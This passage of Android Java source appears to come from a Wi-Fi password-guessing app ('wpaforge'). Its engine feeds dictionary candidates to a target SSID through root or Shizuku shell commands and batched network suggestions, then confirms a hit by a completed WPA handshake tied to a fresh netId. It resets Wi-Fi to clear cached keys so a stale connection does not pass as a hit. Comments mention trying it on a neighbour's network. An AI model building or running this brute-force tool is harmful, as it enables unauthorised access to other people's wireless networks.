        }

        // **如果上一条已经连上了目标，必须先真正断开**。
        //
        // 不做这一步会出假阳性：上一条（比如正确密码）连上目标后，配置虽然被
        // forget 掉，但系统仍保持连接；此时再拿一个**错误密码**发命令，
        // 系统会「本来就连着」→ 判定看到 connected → 误判成这条也成功。
        // 实测：B214 正确密码 12345678 连上后，紧接着的 88888888 被判「看起来连上了」。
        //
        // 只在「已经连着目标」时才断开，正常情况（连着别的网络）零开销。
        if (target.ssid.equals(snapshotSsid())) {
            boolean off = disconnectAndVerify(target.ssid);
            if (!off) {
                return new Attempt(password, Verdict.UNKNOWN,
                        SystemClock.uptimeMillis() - t0,
                        L.s("上一条的连接未能断开，本条判定不可信",
                            "previous link could not be dropped; this attempt is unreliable"),
                        "");
            }
        }

        // 清日志缓冲。判定完全依赖命令之后新产生的日志行，
        // 所以这一步是归因的前提，不能省。
        try { WifiStateLog.clear(shell); } catch (Throwable ignored) {}

        // **命令发出时刻**：判定以此为界。
        // 之后出现的「目标 SSID 已连上」才可能是这条候选的功劳。
        final long commandAt = SystemClock.uptimeMillis();

        // 记录命令前的当前 SSID 与 netId。
        // 若命令后系统回连到别的已保存网络，我们不能把那个连接算到这条候选头上。
        // netId 是更强的判据：即使 SSID 相同，只要 netId 变了就是新建立的联系。
        final String ssidBefore = snapshotSsid();
        final long netIdBefore = currentNetId();

        final String cmd = "cmd wifi connect-network "
                + shellQuote(target.ssid) + " " + security + " " + shellQuote(password);
        final ShellChannel sh = shell;
        new Thread(() -> {
            try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
        }, "wpaforge-engine-conn").start();

        // 命令后目标会得到一个新 netId（配置已在此之前删净并回读确认）。
        // 用它和 status 里的 Net ID 比对，把「连上了目标」严格归因到这条候选。
        sleep(400);
        final long targetNetId = netIdOfTarget(target.ssid);

        android.util.Log.i(TAG, "tryOneShell start: " + target.ssid
                + " pw=" + password.length() + " timeout=" + timeoutMs
                + " ssidBefore=" + ssidBefore);

        final long deadline = t0 + timeoutMs;

        // 本轮是否见过目标「正在尝试」——用于区分「通道没生效」和「密码不对」
        boolean sawAttempt = false;
        // shell 通道是否真的能执行命令（status 能读出内容）。
        // Shizuku 读不到 logcat，sawAttempt 恒为 false；有了这个标志就能把
        // 「密码错」和「通道死」区分开，不再一律 UNKNOWN。
        boolean channelAlive = false;
        String lastStatusSsid = null;
        // 分层证据记录（结束时不命中就逐层打印，让用户看清卡在哪一层）
        int logRounds = 0, statusRounds = 0, watcherHits = 0;
        // 本轮 `cmd wifi status` 读到的 netId（供判据 C/D 复用，避免重复起 shell）
        long roundNetId = -1;

        // 日志判据是否可用：root 通道能读 logcat，Shizuku(shell) 读不到。
        // 探测一次（读一小段），失败就只走 status/netId 判据。
        boolean logReadable = false;
        {
            String probe = WifiStateLog.read(shell, 20);
            if (probe != null && !probe.trim().isEmpty()) logReadable = true;
        }

        // ══════════════════════════════════════════════════════════════
        //  唯一判据：Supplicant state: COMPLETED
        //
        //  判定「密码对不对」的本质是「4-Way Handshake 有没有完成」。
        //  密码错误时握手必然失败，wpa_supplicant 永远到不了 COMPLETED。
        //  这是系统对「密钥协商成功」的宣告，不是我们猜的状态。
        //
        //  为什么砍掉了之前的四条判据（日志 / watcher / wifiinfo / netId 组合）：
        //  它们都能被「系统回连别的网络」满足 —— 实机反复出现假阳性，
        //  自己的网、邻居家的网都在第一条 12345678 上被误判成功。
        //  宁可漏判（把对的判成没连上），也绝不能误判（把错的判成命中）。
        //
        //  四个条件必须**同源于同一行 WifiInfo**：
        //    ① SSID == 目标
        //    ② Supplicant state == COMPLETED
        //    ③ IP 是有效地址（排除 0.0.0.0）
        //    ④ Net ID == 本条新建的 netId
        // ══════════════════════════════════════════════════════════════
        while (SystemClock.uptimeMillis() < deadline) {
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.ABORTED,
                        SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
            }
            sleep(300);

            String st = null;
            try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
            if (st != null && !st.trim().isEmpty()) {
                channelAlive = true;
                statusRounds++;
                SupplicantParser.Info info = SupplicantParser.parse(st);
                lastStatusSsid = info.ssid;

                // 记录「目标是否进入过握手」——用于区分「密码错」和「根本没试」
                if (!sawAttempt && target.ssid.equals(info.ssid)
                        && info.state != null && !info.state.isEmpty()) {
                    sawAttempt = true;
                }

                if (info.isTargetConnected(target.ssid)) {
                    // netId 归因：必须是本条候选新建的那个配置
                    if (targetNetId > 0 && info.netId == targetNetId) {
                        long ms = SystemClock.uptimeMillis() - t0;
                        android.util.Log.i(TAG, "命中: " + info);
                        return new Attempt(password, Verdict.SUCCESS, ms,
                                L.s("握手完成且已获取 IP（确认连上）",
                                    "handshake completed and IP obtained"),
                                "supplicant");
                    }
                    // SSID 和握手都对，但 netId 不是本次的 —— 可能是旧连接/回连
                    android.util.Log.i(TAG, "命中候选但 netId 不符，继续等: " + info);
                }
            }
        }

        long total = SystemClock.uptimeMillis() - t0;

        // 超时后的归类
        boolean currentOnTarget = target.ssid.equals(snapshotSsid());
        if (currentOnTarget) {
            long nowId = currentNetId();
            if (nowId >= 0 && netIdBefore >= 0 && nowId == netIdBefore) {
                // 还是命令前那条连接 —— 不能算本次命中
                currentOnTarget = false;
            }
        }
        String detail;
        Verdict verdict;
        if (currentOnTarget) {
            // **不能因为「现在连着目标」就判成功**。
            //
            // 这正是那批假阳性的来源：系统回连、旧连接残留、缓存凭据……
            // 都会让这里为真，而它们跟当前这条候选没有关系。
            // 没有「本次新建立」的正面证据（新 netId / 本次日志），就只能存疑。
            detail = L.s("当前连着目标，但没有本次连接的证据（可能是原有连接或缓存凭据）",
                    "on target now, but no evidence of a fresh connection "
                            + "(possibly pre-existing or cached credentials)");
            verdict = Verdict.UNKNOWN;
        } else if (!sawAttempt && !channelAlive) {
            // 既没看到尝试、通道又完全不响应 —— 是通道/命令问题，不是密码错。
            // 归 UNKNOWN，避免把正确密码误报成错误。
            detail = L.s("命令未生效（通道无响应）",
                    "command had no effect (channel unresponsive)");
            verdict = Verdict.UNKNOWN;
        } else if (!sawAttempt && channelAlive
                && lastStatusSsid != null && target.ssid.equals(lastStatusSsid)) {
            // 通道活着，但结束时 status 显示连着目标却始终没判定成功 ——
            // 可能是连接太慢或状态机没给出证据，保守归 UNKNOWN。
            detail = L.s("连接状态不明（通道正常但证据不足）",
                    "inconclusive (channel ok, insufficient evidence)");
            verdict = Verdict.UNKNOWN;
        } else {
            detail = L.s("未连上（已尝试）", "not connected (attempted)");
            verdict = Verdict.AUTH_FAIL;
        }

        android.util.Log.i(TAG, "tryOneShell end: " + total + "ms sawAttempt=" + sawAttempt
                + " channelAlive=" + channelAlive + " lastStatusSsid=" + lastStatusSsid
                + " currentOnTarget=" + currentOnTarget
                + " verdict=" + verdict);

        // 分层证据摘要（未命中时也给出，方便定位是哪层的问题）
        detail = detail + L.f(" [层: 日志%d/%s · status%d/%s · 事件%d]",
                " [layers: log%d/%s status%d/%s events%d]",
                logRounds, logReadable ? "可读" : "不可读",
                statusRounds, channelAlive ? "通" : "断",
                watcherHits);

        return new Attempt(password, verdict, total, detail, "");
    }

    private boolean watcherRegistered() {
        return watcher != null;
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    private static String shellQuote(String s) {
        if (s == null) return "''";
        return "'" + s.replace("'", "'\\''") + "'";
    }

    // ------------------------------------------------------------------ 批量交给系统

    /**
     * 一次性把一批候选交给系统（Android 11+），只弹一次确认框。
     *
     * <p>语义与逐条模式**不同**，必须让用户知道：
     * <ul>
     *   <li>系统自己去试，顺序和时间由系统决定</li>
     *   <li>我们只能等它连上，**不能**知道它在试哪一条</li>
     *   <li>所以命中时拿到的密码是**推断**的，不是逐条确认的</li>
     * </ul>
     *
     * <p>适合「网络很多、受不了逐条弹窗」的场景；
     * 要精确结果仍然应该用逐条模式或 Shizuku。
     *
     * @param batchSize 一批交多少个，太多系统会排队很久
     * @return 兼容 Android 11 以下返回 false
     */
    public boolean submitBatchToSystem(Context activityCtx, NetRecord target,
                                       List<Candidate> batch) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return false;
        if (target == null || batch == null || batch.isEmpty()) return false;
        try {
            java.util.ArrayList<android.net.wifi.WifiNetworkSuggestion> list =
                    new java.util.ArrayList<>();
            for (Candidate c : batch) {
                if (c.password == null
                        || c.password.length() < 8 || c.password.length() > 63) continue;
                WifiNetworkSpecifier.Builder b = new WifiNetworkSpecifier.Builder()
                        .setSsid(target.ssid);
                // 这里用 specifier 构建器只是为了拿到带密码的实例，
                // 真正提交给系统的是 WifiNetworkSuggestion
                list.add(new android.net.wifi.WifiNetworkSuggestion.Builder()
                        .setSsid(target.ssid)
                        .setWpa2Passphrase(c.password)
                        .build());
            }
            if (list.isEmpty()) return false;
            // Android 11+ 支持一次提交多个
            int status = wifi.addNetworkSuggestions(list);
            return status == WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS;
        } catch (Throwable t) {
            android.util.Log.w(TAG, "submitBatchToSystem 失败: " + t);
            return false;
        }
    }

    /** 清掉本应用提交的全部建议 */
    public void clearSystemSuggestions() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                wifi.removeNetworkSuggestions(new java.util.ArrayList<>());
            }
        } catch (Throwable ignored) {}
    }

    /**
     * 当前 ROM 是否支持“批量交给系统”。
     * Android 11+ 才有，且需要系统支持多建议提交。
     */
    public boolean supportsBatchSubmit() {
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.R;
    }

    /**
     * 当前 ROM 上逐条 requestNetwork 会不会弹确认框。
     *
     * Android 10-15 都会弹（系统强制，无官方开关）。
     * 这里如实告诉用户，不做假承诺。
     */
    public String popupNote() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            return L.s("系统版本过低，无法使用免 Root 模式。",
                    "System too old for root-free mode.");
        }
        return L.s("系统会对每一条候选弹一次确认框，这是 Android 的安全设计，"
                        + "无法关闭。\n\n"
                        + "想不被打扰有两条路：\n"
                        + "· 用 Shizuku 模式（推荐，和 Root 一样快且无弹窗）\n"
                        + "· 用“批量交给系统”（只弹一次，但结果是推断的）",
                "Android will show a confirmation dialog for every candidate. "
                        + "This is a platform security requirement and cannot be disabled.\n\n"
                        + "Two ways to avoid the interruptions:\n"
                        + "· use Shizuku mode (recommended - as fast as root, no dialogs)\n"
                        + "· use \"submit batch to system\" (one dialog, but the result is inferred)");
    }

    // ------------------------------------------------------------------ 命中复核

    /** 复核结果 */
    public static final class VerifyResult {
        /** 复验是否成功复现 */
        public final boolean reproduced;
        /** 复验耗时 */
        public final long elapsedMs;
        public final String detail;
        VerifyResult(boolean reproduced, long ms, String detail) {
            this.reproduced = reproduced;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
        }
    }

    /**
     * 命中之后做一次**独立复验**。
     *
     * <p>步骤：
     * <ol>
     *   <li>断开当前连接，并确认断开了（目标保持未连 3 秒以上）</li>
     *   <li>用**同一个密码**再连一次</li>
     *   <li>只有这次也成功，才算「可复现」</li>
     * </ol>
     *
     * <p>为什么需要它：单次「连上了」无法区分两种情况 ——
     * 真是这条密码连上的，还是系统自己重连的。这两者在日志里长得一样。
     * <b>能被复现的才算数。</b>
     *
     * @param timeoutMs 复验最长等待
     */
    public VerifyResult verifyHit(NetRecord target, String security, String password, long timeoutMs) {
        long t0 = SystemClock.uptimeMillis();

        if (shell == null) {
            return new VerifyResult(false, 0,
                    L.s("没有 shell 通道，无法复验", "no shell channel; cannot verify"));
        }

        // 1. 断开 + 确认
        try { shell.exec("cmd wifi forget-network 0", 2000); } catch (Throwable ignored) {}
        boolean off = disconnectAndVerify(target.ssid);
        if (!off) {
            return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                    L.s("复验前无法断开目标，结果不可信",
                        "could not disconnect before verification; result unreliable"));
        }

        // 2. 重新渋净配置
        try { shell.forgetTarget(target.ssid); } catch (Throwable ignored) {}

        // 3. 用同一密码再连一次
        final String cmd = "cmd wifi connect-network "
                + shellQuote(target.ssid) + " " + security + " " + shellQuote(password);
        final ShellChannel sh = shell;
        final long commandAt0 = SystemClock.uptimeMillis();
        new Thread(() -> {
            try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
        }, "wpaforge-verify-conn").start();

        // 复验判据与主判定**保持一致**（四层，任一确认即通过）。
        //
        // 旧实现只认 NetworkWatcher 事件，而 Shizuku 通道下回调常常拿不到 SSID，
        // 于是正确密码在主判定里明明「看起来连上了」，到复验这一步却永远失败，
        // 被降级成 UNKNOWN —— 用户看到的就是「密码对也判不出来」。
        //
        // 复验的前提是「已断开并确认断开」，此刻目标必然未连接，
        // 因此任何随后的连接证据都只能来自这次重连，归因是确定的。
        final long commandAt = commandAt0;
        final String ssidBefore = snapshotSsid();
        final long netIdBefore = currentNetId();

        // 日志在这一轮是否可读（Shizuku 读不到，root 可以）
        boolean logReadable = false;
        {
            String probe = WifiStateLog.read(shell, 20);
            if (probe != null && !probe.trim().isEmpty()) logReadable = true;
        }

        long deadline = t0 + timeoutMs;
        while (SystemClock.uptimeMillis() < deadline) {
            if (cancelFlag.get()) {
                return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                        L.s("复验被取消", "verification cancelled"));
            }
            sleep(300);

            // 判据 A：状态机日志（root）
            if (logReadable) {
                String stateLog = WifiStateLog.read(shell, 600);
                if (stateLog != null && WifiStateLog.sawConnectedFor(stateLog, target.ssid)) {
                    long ms = SystemClock.uptimeMillis() - t0;
                    android.util.Log.i(TAG, "复验通过(状态机日志)");
                    return new VerifyResult(true, ms,
                            L.s("复验通过（用同一密码能再次连上）",
                                "verified (reconnected with the same passphrase)"));
                }
            }

            // 判据 B：status + netId（两条通道都可用）
            String st = null;
            try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
            if (st != null && StatusParser.connectedTo(st, target.ssid)) {
                long nowId = StatusParser.parse(st, target.ssid).netId;
                boolean newLink = !target.ssid.equals(ssidBefore)
                        || (nowId >= 0 && netIdBefore >= 0 && nowId != netIdBefore);
                if (newLink) {
                    long ms = SystemClock.uptimeMillis() - t0;
                    android.util.Log.i(TAG, "复验通过(status): netId=" + nowId);
                    return new VerifyResult(true, ms,
                            L.s("复验通过（用同一密码能再次连上）",
                                "verified (reconnected with the same passphrase)"));
                }
            }

            // 判据 C：watcher 事件
            long at = watcher != null
                    ? watcher.firstAvailableAfter(target.ssid, commandAt) : -1;
            if (at > 0) {
                long ms = SystemClock.uptimeMillis() - t0;
                android.util.Log.i(TAG, "复验通过(watcher): 事件在命令后 " + (at - commandAt) + "ms");
                return new VerifyResult(true, ms,
                        L.s("复验通过（用同一密码能再次连上）",
                            "verified (reconnected with the same passphrase)"));
            }

            // 判据 D：本地 API
            String nowSsid = snapshotSsid();
            if (target.ssid.equals(nowSsid) && !target.ssid.equals(ssidBefore)) {
                long ms = SystemClock.uptimeMillis() - t0;
                android.util.Log.i(TAG, "复验通过(WifiInfo)");
                return new VerifyResult(true, ms,
                        L.s("复验通过（用同一密码能再次连上）",
                            "verified (reconnected with the same passphrase)"));
            }
        }

        // 超时了。区分两种原因，便于排查
        boolean onTargetNow = target.ssid.equals(snapshotSsid());
        if (onTargetNow) {
            return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                    L.s("复验失败：确实连上了目标，但没收到连接证据（监听可能失效）",
                        "verification failed: on target now but no connect evidence "
                                + "(listener may be broken)"));
        }

        return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                L.s("复验失败：用同一密码没有再连上 —— 很可能是误判，或信号太差",
                    "verification failed: could not reconnect with the same passphrase "
                            + "- likely a false positive, or the signal is too weak"));
    }

    // ------------------------------------------------------------------ 批量跑

    /**
     * 跑一批候选。阻塞，放工作线程。
     *
     * @param timeoutMsPerItem 每条最长等多久；<=0 用默认
     */
    public void run(NetRecord target, List<Candidate> candidates, int startOffset,
                    long timeoutMsPerItem, Listener l) {
        CheckResult chk = check();
        if (!chk.ok) { l.onBlocked(chk.title, chk.detail); return; }
        if (target == null || target.ssid == null || target.ssid.isEmpty()) {
            l.onBlocked(L.s("目标信息不完整", "Incomplete target"),
                    L.s("没有拿到目标的 SSID。", "The target SSID is missing."));
            return;
        }
        if (candidates == null || candidates.isEmpty()) {
            l.onBlocked(L.s("候选为空", "No candidates"),
                    L.s("字典里没有可用的候选。", "The dictionary has no usable candidates."));
            return;
        }

        cancelFlag.set(false);
        pauseFlag.set(false);
        consecutiveTimeouts = 0;

        // 启动事件监听（判定只认它）
        if (watcher != null) {
            watcher.clear();
            watcher.start();
            // 把监听器状态打到 UI 上。
            // 判定完全依赖它，如果它没生效，
            // 必须能从界面看出来，而不是去翻 logcat。
            l.onLog(L.f("事件监听器: %s",
                    "event watcher: %s",
                    watcher.isRegistered()
                            ? L.s("已启用（判定可用）", "active (verdict available)")
                            : L.s("启用失败（判定不可用）", "failed to register (verdict unavailable)")));
            l.onLog(L.s("  说明: 判定完全依赖系统回调。若回调拿不到 SSID，",
                    "  Note: the verdict depends entirely on system callbacks. "
                            + "If a callback cannot carry an SSID,"));
            l.onLog(L.s("  所有密码都会被判为「无法确认」，请不要误以为密码不对。",
                    "  every passphrase will read as unconfirmed - that is not a wrong passphrase."));
        } else {
            l.onLog(L.s("事件监听器未初始化",
                    "event watcher not initialised"));
        }

        // **跑之前先自检通道**
        //
        // 用户看到的「执行方式: Shizuku」只是设置里的一个数字，
        // 跟通道能不能用毫无关系。之前没有这一步，通道断了也照跑 97 条，
        // 全是「未连上」，用户以为是密码不对 —— 这就是他反复遇到的
        // 「明明密码对却识别不到」。
        ChannelProbe probe = probeChannel();
        l.onLog(L.s("── 通道自检 ──", "── channel self-check ──"));
        for (String line : probe.steps) l.onLog("  " + line);
        if (!probe.ok) {
            l.onLog(L.s("✗ 自检未通过，已停止。", "x self-check failed, stopping."));
            l.onBlocked(probe.summary, probe.detail);
            return;
        }
        l.onLog("✓ " + probe.summary);

        // **完整环境诊断** —— 把每一层能测的都测一遍并写进日志。
        //
        // 用户报障时只能看到「没连上」「跳过判定」，不知道卡在哪一层。
        // 判定链有 4 层判据 + 3 种通道，任何一层不通表现都一样。
        // 这里逐项给出结论，界面和日志文件里都有，发出来即可定位。
        try {
            EnvDiagnostics.Report diag = EnvDiagnostics.run(appCtx, mode, shell);
            for (String line : diag.text.toString().split("\n")) {
                l.onLog(line);
            }
        } catch (Throwable t) {
            l.onLog("环境诊断执行失败: " + t.getClass().getSimpleName());
        }

        // ---- 清缓存：重启一次 WiFi ----
        //
        // 为什么要这一步：WPA2 有 PMKSA 缓存（快速重连用的密钥缓存）。
        // 即便 forget 了配置，wpa_supplicant 仍可能在短时间内用缓存密钥
        // 连回同一个 AP —— 此时**用错误密码也会连上**，判定就成了假阳性。
        // 实机复现：正确密码跑成功后，紧接着用错误密码再跑，仍显示「已连上」。
        //
        // 重启 WiFi（off -> on）会强制 wpa_supplicant 重来，缓存被清掉。
        // 只在任务开始时做一次，不影响逐条速度。
        if (shell != null) {
            l.onLog(L.s("重置 WiFi（清掉密钥缓存，避免用缓存的旧密码误判）…",
                    "Resetting Wi-Fi (clearing key cache to avoid stale-credential false positives)..."));
            try { shell.exec("cmd wifi set-wifi-enabled disabled", 8000); } catch (Throwable ignored) {}
            sleep(1500);
            try { shell.exec("cmd wifi set-wifi-enabled enabled", 8000); } catch (Throwable ignored) {}
            // 等它起来
            for (int i = 0; i < 20; i++) {
                sleep(500);
                String wprobe = null;
                try { wprobe = shell.exec("cmd wifi status", 4000); } catch (Throwable ignored) {}
                if (wprobe != null && wprobe.contains("Wifi is enabled")) break;
            }
            l.onLog(L.s("WiFi 已重置", "Wi-Fi reset done"));
        }

        // ---- 建立基线 ----
        //
        // **这是修「任何密码都成功」的关键一步**。
        // 如果手机本来就连着目标网络，那么第一条候选一进来就会看到
        // 「当前 SSID == 目标」—— 旧实现据此判成功，于是 12345678、
        // 00000000 全都在第一条“命中”。
        //
        // 所以必须先断开，并**确认真的断开了**，把基线清成「未连接目标」。
        // 之后任何“连上了”才是这条候选的功劳。
        String baseline = snapshotSsid();
        if (target.ssid.equals(baseline)) {
            l.onLog(L.f("建立基线：当前连着目标 %s，先断开…",
                    "Baseline: already connected to %s, disconnecting first...", target.ssid));
            boolean ok = disconnectAndVerify(target.ssid);
            if (ok) {
                l.onLog(L.s("✓ 基线已清空（当前未连接目标）",
                        "baseline cleared (not connected to target)"));
            } else {
                l.onLog(L.s("⚠ 无法断开目标连接。",
                        "could not disconnect from the target."));
                l.onLog(L.s("  此时任何密码都会看到「已经连着目标」，",
                        "  Any passphrase would then see already-connected,"));
                l.onLog(L.s("  结果将被标记为「无法确认」而不是成功。",
                        "  and results will be marked UNKNOWN instead of success."));
            }
        } else {
            l.onLog(L.f("基线：当前连接 = %s（不是目标，可以直接开始）",
                    "Baseline: currently on %s (not the target, ready to start)",
                    baseline == null ? L.s("无", "none") : baseline));
        }

        final long perItem = timeoutMsPerItem > 0 ? timeoutMsPerItem
                : (mode == Prefs.MODE_NO_ROOT ? 15_000L : 10_000L);
        final String security = securityArg(target);
        final int total = candidates.size();
        final int start = Math.max(0, Math.min(startOffset, total));

        int tested = 0;
        int cursor = start;
        String hit = null;
        long beginAt = SystemClock.uptimeMillis();

        l.onLog(L.f("引擎启动：%s，共 %d 条，单条最长 %.1f 秒",
                "Engine: %s, %d candidates, up to %.1fs each",
                channelName(), total, perItem / 1000.0));

        try {
            for (int i = start; i < total; i++) {
                if (cancelFlag.get() || pauseFlag.get()) break;

                Candidate c = candidates.get(i);
                tested++;
                cursor = i + 1;
                l.onAttemptStart(cursor, total, c.password);

                Attempt a = tryOne(target, security, c.password, perItem);

                // 命中即命中 —— 复验只作为**附加信息**，不再一票否决。
                //
                // 为什么改：主判定用的是四层硬证据（状态机日志 / status+netId 绑定 /
                // 网络事件 / WifiInfo），其中 netId 是系统分配的、对不上就不算命中，
                // 归因已经足够严密，不需要靠「断开重连」再来一遍。
                //
                // 而「断开重连」有实际副作用：
                //   · 会打断用户当前的网络（用户明确反馈过）
                //   · 部分路由器/AP 会限制短时间内的快速重连（802.11 关联退避），
                //     于是正确密码也「复验失败」——用户看到的就是「明明连上了却说不算」。
                // 所以复验失败的结论只能说明「无法复现」，不能推翻已经确立的连接事实。
                // 命中即命中，立刻结束 —— **不再做「断开重连」式复验**。
                //
                // 为什么移除复验：
                //   · 主判定用的是四层硬证据（状态机日志 / status+netId 绑定 /
                //     网络事件 / WifiInfo），其中 netId 由系统分配，
                //     对不上就不算命中，归因已经足够严密；
                //   · 复验要「断开再连一次」，会**打断用户当前的网络**；
                //   · 部分路由器/AP 对短时间内的快速重连有退避，正确密码也会
                //     「复验失败」——用户看到的就是「明明连上了却说不算命中」。
                //   综上：收益小、副作用大、还会造成假失败，直接去掉。
                boolean reported = false;
                if (a.isSuccess()) {
                    l.onLog(L.f("候选 %s 已连上（依据: %s）",
                            "candidate %s connected (via %s)",
                            c.password, a.confirmedBy));
                    l.onAttemptResult(a);
                    hit = c.password;
                    reported = true;
                    break;
                }

                if (!reported) {
                    l.onAttemptResult(a);
                }

                // 判定失败时把事件摘要打出来。
                // 「没收到事件」和「收到事件但 SSID 对不上」是两种不同故障。
                if (watcher != null && a.verdict != Verdict.SUCCESS) {
                    int n = watcher.eventCount();
                    if (n == 0) {
                        // 没有事件 —— 把监听器自己的诊断也带上。
                        // 「没注册」「注册了但系统不回调」「回调了但拿不到 SSID」
                        // 是三种完全不同的故障。
                        l.onLog(L.s("  监听器诊断: ", "  watcher: ") + watcher.diagnose());
                    } else {
                        StringBuilder sb = new StringBuilder("  ");
                        sb.append(L.s("事件 ", "events ")).append(n).append(": ");
                        for (NetworkWatcher.Event e : watcher.recent(6)) {
                            sb.append(e.ssid).append(e.available ? "↑" : "↓").append(' ');
                        }
                        l.onLog(sb.toString().trim());
                    }
                }

                if (a.verdict == Verdict.TIMEOUT) {
                    consecutiveTimeouts++;
                    if (consecutiveTimeouts == TIMEOUT_ALERT) {
                        l.onLog(L.s(
                                "连续多条超时 —— 通道可能没真正生效。"
                                + "请检查授权/权限，或换一种执行方式。",
                                "Several timeouts in a row - the channel may not be working. "
                                + "Check permissions or switch execution mode."));
                    }
                } else {
                    consecutiveTimeouts = 0;
                }


                double elapsed = Math.max(0.001,
                        (SystemClock.uptimeMillis() - beginAt) / 1000.0);
                double rate = tested / elapsed;
                long eta = rate > 0 ? (long) ((total - cursor) / rate * 1000) : -1;
                l.onProgress(cursor, total, rate, eta);
            }
        } finally {
            if (watcher != null) watcher.stop();
            String outcome;
            if (hit != null) outcome = "DONE_HIT";
            else if (pauseFlag.get()) outcome = "PAUSED";
            else if (cancelFlag.get()) outcome = "STOPPED";
            else outcome = "DONE_MISS";
            l.onFinished(tested, cursor, hit, outcome);
        }
    }

    private String channelName() {
        if (mode == Prefs.MODE_NO_ROOT) return L.s("免 Root（精确连接）", "root-free (precise)");
        if (mode == Prefs.MODE_SHIZUKU) return "Shizuku";
        return "Root";
    }

    private static String securityArg(NetRecord t) {
        switch (t.security) {
            case OPEN: return "open";
            case OWE:  return "owe";
            case WEP:  return "wep";
            case WPA3: return "wpa3";
            default:   return "wpa2";
        }
    }

    public void cancel() { cancelFlag.set(true); }
    public void pause()  { pauseFlag.set(true); }
    public void resume() { pauseFlag.set(false); }
    public boolean isPaused() { return pauseFlag.get(); }
}
